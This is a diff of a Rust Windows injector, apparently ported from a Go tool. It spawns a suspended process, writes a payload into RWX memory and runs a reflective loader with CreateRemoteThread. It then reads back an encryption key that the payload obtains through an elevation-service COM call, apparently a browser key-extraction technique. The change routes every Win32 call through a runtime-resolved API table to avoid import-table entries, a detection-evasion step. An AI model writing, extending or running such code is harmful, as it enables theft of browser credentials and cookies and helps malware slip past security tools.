@@ -16,18 +16,14 @@ use std::path::PathBuf;
 use std::ptr;
 use std::time::Duration;
 
-use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, WAIT_OBJECT_0, WAIT_TIMEOUT};
-use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
-use windows::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
-};
+use windows::Win32::Foundation::{HANDLE, WAIT_OBJECT_0, WAIT_TIMEOUT};
+use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 use windows::Win32::System::Threading::{
-    CREATE_SUSPENDED, CreateProcessW, CreateRemoteThread, GetExitCodeProcess,
-    PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW, TerminateProcess,
-    WaitForSingleObject,
+    CREATE_SUSPENDED, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
 };
 use windows::core::{Error, HRESULT, PCWSTR, PWSTR};
 
+use crate::apitable::kernel32;
 use crate::patch::patch_preresolved_imports;
 use crate::payload::{self, KEY_LEN, KEY_STATUS_READY};
 use crate::pe::{PeArch, PeError, detect_pe_arch, find_export_file_offset};
@@ -39,6 +35,12 @@ const STILL_ACTIVE: u32 = 0x103;
 /// `Error::from_win32`; HRESULT::from_win32 is the sanctioned conversion).
 fn win32_err(code: u32) -> Error {
     Error::from_hresult(HRESULT::from_win32(code))
+}
+
+/// Raw last-error code via the resolved export (no IAT entry).
+fn raw_last_error() -> u32 {
+    // SAFETY: GetLastError is side-effect-free and safe to call anywhere.
+    unsafe { (kernel32().get_last_error)().0 }
 }
 
 /// Injector knobs; mirrors Go's `Reflective{WaitTimeout}`.
@@ -161,7 +163,7 @@ impl Drop for OwnedHandle {
         // SAFETY: CloseHandle on a handle we own (or an invalid sentinel) is
         // always safe; failure here is benign (handle already closed).
         unsafe {
-            let _ = CloseHandle(self.0);
+            let _ = (kernel32().close_handle)(self.0).as_bool();
         }
     }
 }
@@ -240,27 +242,28 @@ fn spawn_suspended(exe_path: &str) -> Result<(PROCESS_INFORMATION, PathBuf), Inj
     // SAFETY: si/pi are zeroed; cmd/exe buffers are NUL-terminated UTF-16 for the
     // call length; NULL env/current-dir inherit our block; CREATE_SUSPENDED keeps
     // main() from running until we resume. CreateProcessW retains none of the args.
-    let result = unsafe {
-        CreateProcessW(
+    let ok = unsafe {
+        let k = kernel32();
+        (k.create_process_w)(
             PCWSTR(exe_wide.as_ptr()),
-            Some(PWSTR(cmd_wide.as_mut_ptr())),
-            None,
-            None,
-            false,
+            PWSTR(cmd_wide.as_mut_ptr()),
+            ptr::null(),
+            ptr::null(),
+            false.into(),
             PROCESS_CREATION_FLAGS(CREATE_SUSPENDED.0),
-            None,
+            ptr::null(),
             PCWSTR(ptr::null()),
             &si,
             &mut pi,
         )
+        .as_bool()
     };
 
-    match result {
-        Ok(()) => Ok((pi, udd)),
-        Err(e) => {
-            let _ = std::fs::remove_dir_all(&udd);
-            Err(InjectError::CreateProcess(e))
-        }
+    if ok {
+        Ok((pi, udd))
+    } else {
+        let _ = std::fs::remove_dir_all(&udd);
+        Err(InjectError::CreateProcess(win32_err(raw_last_error())))
     }
 }
 
@@ -287,36 +290,36 @@ fn validate_and_locate_loader(payload: &[u8]) -> Result<u32, InjectError> {
 fn write_remote_payload(proc: HANDLE, payload: &[u8]) -> Result<usize, InjectError> {
     // SAFETY: allocating RWX remote memory for the payload; freed only when the
     // child dies (guaranteed in inject() via TerminateProcess). Flags mirror Go.
-    // VirtualAllocEx returns a raw pointer in windows-rs 0.62, so NULL = failure.
+    // VirtualAllocEx returns a raw pointer, so NULL = failure.
     let remote_base = unsafe {
-        VirtualAllocEx(
+        (kernel32().virtual_alloc_ex)(
             proc,
-            None,
+            ptr::null(),
             payload.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
         )
     };
     if remote_base.is_null() {
-        // SAFETY: advisory error read following the failed call.
-        return Err(InjectError::VirtualAllocEx(win32_err(
-            unsafe { GetLastError() }.0,
-        )));
+        return Err(InjectError::VirtualAllocEx(win32_err(raw_last_error())));
     }
 
     let mut written: usize = 0;
     // SAFETY: remote_base is the RWX region we just allocated; payload is a
     // valid slice for the call. written is an out-param initialized by the OS.
-    unsafe {
-        WriteProcessMemory(
+    let ok = unsafe {
+        (kernel32().write_process_memory)(
             proc,
             remote_base.cast(),
             payload.as_ptr().cast(),
             payload.len(),
-            Some(&mut written),
+            &mut written,
         )
+        .as_bool()
+    };
+    if !ok {
+        return Err(InjectError::WriteProcessMemory(win32_err(raw_last_error())));
     }
-    .map_err(InjectError::WriteProcessMemory)?;
     if written != payload.len() {
         return Err(InjectError::WriteProcessMemory(win32_err(1205)));
     }
@@ -331,23 +334,32 @@ fn run_and_wait(proc: HANDLE, entry: usize, wait: Duration) -> Result<(), Inject
     // is the purpose of this function.
     let start: ThreadRoutine = unsafe { std::mem::transmute(entry) };
     // SAFETY: CreateRemoteThread at the loader entry with NULL param;
-    // lpstartaddress takes the routine directly (LPTHREAD_START_ROUTINE is
-    // Option<fn>) in windows-rs 0.62 — no Option-wrapping needed beyond Some.
-    let h_thread = match unsafe { CreateRemoteThread(proc, None, 0, Some(start), None, 0, None) } {
-        Ok(h) => h,
-        Err(e) => {
-            return Err(if is_target_exiting(proc) {
-                InjectError::create_remote_thread_dead(&proc, e)
-            } else {
-                InjectError::create_remote_thread_blocked(e)
-            });
-        }
+    // lpstartaddress takes the routine directly (LPTHREAD_START_ROUTINE).
+    let h_thread = unsafe {
+        (kernel32().create_remote_thread)(
+            proc,
+            ptr::null(),
+            0,
+            start,
+            ptr::null(),
+            0,
+            ptr::null_mut(),
+        )
     };
+    if h_thread.0.is_null() {
+        let cause = win32_err(raw_last_error());
+        return Err(if is_target_exiting(proc) {
+            InjectError::create_remote_thread_dead(&proc, cause)
+        } else {
+            InjectError::create_remote_thread_blocked(cause)
+        });
+    }
     let _thread_guard = OwnedHandle(h_thread);
 
     // SAFETY: waits on the just-created thread handle.
-    let state =
-        unsafe { WaitForSingleObject(h_thread, wait.as_millis().min(u32::MAX as u128) as u32) };
+    let state = unsafe {
+        (kernel32().wait_for_single_object)(h_thread, wait.as_millis().min(u32::MAX as u128) as u32)
+    };
     if state == WAIT_OBJECT_0 {
         Ok(())
     } else if state == WAIT_TIMEOUT {
@@ -362,16 +374,20 @@ fn run_and_wait(proc: HANDLE, entry: usize, wait: Duration) -> Result<(), Inject
 fn is_target_exiting(proc: HANDLE) -> bool {
     let mut exit_code = 0u32;
     // SAFETY: GetExitCodeProcess on a valid handle; exit_code is a plain out-param.
-    unsafe { GetExitCodeProcess(proc, &mut exit_code) }.is_ok() && exit_code != STILL_ACTIVE
+    unsafe { (kernel32().get_exit_code_process)(proc, &mut exit_code) }.as_bool()
+        && exit_code != STILL_ACTIVE
 }
 
 impl InjectError {
     fn create_remote_thread_dead(proc: &HANDLE, cause: Error) -> Self {
         let mut exit_code = 0u32;
         // SAFETY: GetExitCodeProcess out-param, see is_target_exiting.
-        let code = unsafe { GetExitCodeProcess(*proc, &mut exit_code) }
-            .map(|_| exit_code)
-            .unwrap_or(0);
+        let code = if unsafe { (kernel32().get_exit_code_process)(*proc, &mut exit_code) }.as_bool()
+        {
+            exit_code
+        } else {
+            0
+        };
         InjectError::DeadTarget {
             cause,
             exit_code: code,
@@ -391,16 +407,19 @@ fn read_scratch(proc: HANDLE, remote_base: usize) -> Result<Scratch, InjectError
     // SAFETY: reads 12 bytes at remote_base+0x28 — the payload's scratch region
     // (still valid: child not yet terminated). Bounds are within the DOS-header
     // area the payload writes (0x28..0x34).
-    unsafe {
-        ReadProcessMemory(
+    let ok = unsafe {
+        (kernel32().read_process_memory)(
             proc,
             (remote_base + payload::MARKER_OFFSET) as *const c_void,
             hdr.as_mut_ptr().cast(),
             hdr.len(),
-            None,
+            ptr::null_mut(),
         )
+        .as_bool()
+    };
+    if !ok {
+        return Err(InjectError::ReadScratch(win32_err(raw_last_error())));
     }
-    .map_err(InjectError::ReadScratch)?;
 
     let marker = hdr[0];
     let status = hdr[1];
@@ -417,16 +436,19 @@ fn read_scratch(proc: HANDLE, remote_base: usize) -> Result<Scratch, InjectError
     let mut key = [0u8; KEY_LEN];
     // SAFETY: reads KEY_LEN bytes at remote_base+KEY_OFFSET (0x40..0x60); the
     // payload writes the key there only after publishing status==READY.
-    unsafe {
-        ReadProcessMemory(
+    let ok = unsafe {
+        (kernel32().read_process_memory)(
             proc,
             (remote_base + payload::KEY_OFFSET) as *const c_void,
             key.as_mut_ptr().cast(),
             key.len(),
-            None,
+            ptr::null_mut(),
         )
+        .as_bool()
+    };
+    if !ok {
+        return Err(InjectError::ReadScratch(win32_err(raw_last_error())));
     }
-    .map_err(InjectError::ReadScratch)?;
     Ok((marker, status, err_code, hresult, com_err, Some(key)))
 }
 
@@ -461,7 +483,7 @@ pub fn inject(
     // elevation_service COM call rely on a fully-initialized PEB (Go rationale).
     // SAFETY: pi.hThread is the suspended primary thread from CreateProcessW.
     unsafe {
-        let _ = ResumeThread(pi.hThread);
+        let _ = (kernel32().resume_thread)(pi.hThread);
     }
     std::thread::sleep(Injector::default().resume_settle);
 
@@ -494,10 +516,13 @@ pub fn inject(
 fn terminate_and_wait(proc: HANDLE, wait: Duration) -> Result<(), InjectError> {
     // SAFETY: TerminateProcess reclaims the remote memory before returning
     // (Go does the same); exit code 0 is unused by the caller.
-    unsafe { TerminateProcess(proc, 0) }.map_err(InjectError::Terminate)?;
+    let ok = unsafe { (kernel32().terminate_process)(proc, 0).as_bool() };
+    if !ok {
+        return Err(InjectError::Terminate(win32_err(raw_last_error())));
+    }
     // SAFETY: waits on the valid process handle.
     unsafe {
-        WaitForSingleObject(proc, wait.as_millis().min(u32::MAX as u128) as u32);
+        (kernel32().wait_for_single_object)(proc, wait.as_millis().min(u32::MAX as u128) as u32);
     }
     Ok(())
 }
